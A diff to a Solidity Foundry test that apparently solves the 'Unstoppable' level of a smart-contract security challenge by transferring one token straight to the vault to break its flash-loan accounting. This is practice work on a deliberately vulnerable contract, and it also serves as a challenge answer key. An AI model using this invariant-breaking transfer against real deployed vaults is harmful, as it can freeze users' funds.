@@ -4,6 +4,10 @@ pragma solidity >=0.8.0;
 import "forge-std/Test.sol";
 import "../../src/unstoppable/UnstoppableLevel.sol";
 
+interface IToken {
+  function transfer(address, uint256) external;
+}
+
 contract UnstoppableTest is Test {
   UnstoppableLevel internal level = new UnstoppableLevel();
 
@@ -12,11 +16,8 @@ contract UnstoppableTest is Test {
   }
 
   function testExploit() public {
-    address token = address(level.token());
-    address vault = address(level.vault());
-
-    (bool success,) = token.call(abi.encodeWithSignature("transfer(address,uint256)", vault, 10));
-    success;
+    IToken token = IToken(address(level.token()));
+    token.transfer(address(level.vault()), 1);
 
     level.validate();
   }
